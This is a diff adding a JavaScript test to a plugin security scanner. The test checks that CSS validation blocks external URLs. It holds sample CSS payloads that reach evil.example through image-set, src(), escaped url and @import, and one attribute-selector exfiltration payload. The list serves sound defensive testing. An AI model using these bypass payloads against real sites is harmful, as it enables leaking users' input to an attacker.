@@ -167,6 +167,41 @@ test('аудит: Node, eval, сеть, cookie и CSS блокируются', (
   expect(validateCss('@import "https://evil.example/x.css";').ok).toBe(false);
 });
 
+test('CSS: внешние адреса не проходят через image-set, src() и экранирование', () => {
+  const allowed = [
+    'a { background: url(data:image/png;base64,AAAA) }',
+    'a { background-image: image-set("data:image/png;base64,AA" 1x) }',
+    'a { background: url(/static/x.png) }',
+    'a { filter: url(#glow) }',
+    'a::before { content: "\\2014" }',
+  ];
+  for (const css of allowed) expect(validateCss(css).ok, css).toBe(true);
+
+  const blocked = [
+    'a { background-image: image-set("https://evil.example/a" 1x) }',
+    "input[value^='a'] { background: -webkit-image-set('//evil.example/a' 1x) }",
+    '@font-face { font-family: x; src: src("https://evil.example/f") }',
+    'a { background: u\\72l(https://evil.example/a) }',
+    'a { background: url(ht\\74 tp://evil.example/a) }',
+    'a { background: url("/\\\\evil.example/a") }',
+    'a { background: url(/**/https://evil.example/a) }',
+    '@\\69mport "x.css";',
+  ];
+  for (const css of blocked) expect(validateCss(css).ok, css).toBe(false);
+
+  // То же правило работает и при установке пакета.
+  const report = scanFiles(
+    new Map([
+      ['plugin.json', Buffer.from(JSON.stringify(rawManifest()))],
+      ['index.js', Buffer.from("octo.notify('ok');")],
+      ['style.css', Buffer.from('a { background: image-set("https://evil.example/a" 1x) }')],
+    ]),
+    manifestWith(),
+  );
+  expect(report.verdict).toBe('blocked');
+  expect(report.findings.map((finding) => finding.rule)).toContain('css-remote-url');
+});
+
 test('решение об установке учитывает подпись и настройки', () => {
   const safeReport = { verdict: 'safe' };
   const blockedReport = { verdict: 'blocked' };
